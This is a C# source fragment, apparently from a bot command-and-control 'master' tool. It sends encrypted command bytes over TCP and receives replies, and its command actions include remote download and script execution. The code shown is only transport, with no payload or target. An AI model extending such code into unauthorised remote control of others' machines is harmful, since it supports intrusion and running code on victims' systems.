using System;
using System.Net.Sockets;
//
using static Link_Master.Worker.Bot;

namespace Link_Master.Worker
{
    internal static partial class LinkWorker
    {
        private static void ReceiveResponse(ref Socket socket, ref ChannelLink channelLink, ref Command command, out Byte[] response)
        {
            switch (command.CommandAction)
            {
                case CommandAction.RemoteDownload:
                    socket.ReceiveTimeout = 51200;
                    break;

                case CommandAction.ExecuteScript:
                    socket.ReceiveTimeout = 51200;
                    break;

                default:
                    socket.ReceiveTimeout = 25600;
                    break;
            }

            response = AES_TCP.Receive(ref socket, channelLink.AES_Key, channelLink.HMAC_Key);

            socket.ReceiveTimeout = 5120;
        }

        private static void SendRequest(ref Socket socket, ref Command command, ref ChannelLink channelLink)
        {
            Byte[] rawRequest;

            if (command.Data != null && command.Data.Length != 0)
            {
                rawRequest = new Byte[command.Data.Length + 1];

                rawRequest[0] = (Byte)command.CommandAction;
                Buffer.BlockCopy(command.Data, 0, rawRequest, 1, command.Data.Length);
            }
            else
            {
                rawRequest = new Byte[] { (Byte)command.CommandAction };
            }

            AES_TCP.Send(ref socket, ref rawRequest, channelLink.AES_Key, channelLink.HMAC_Key);
        }
    }
}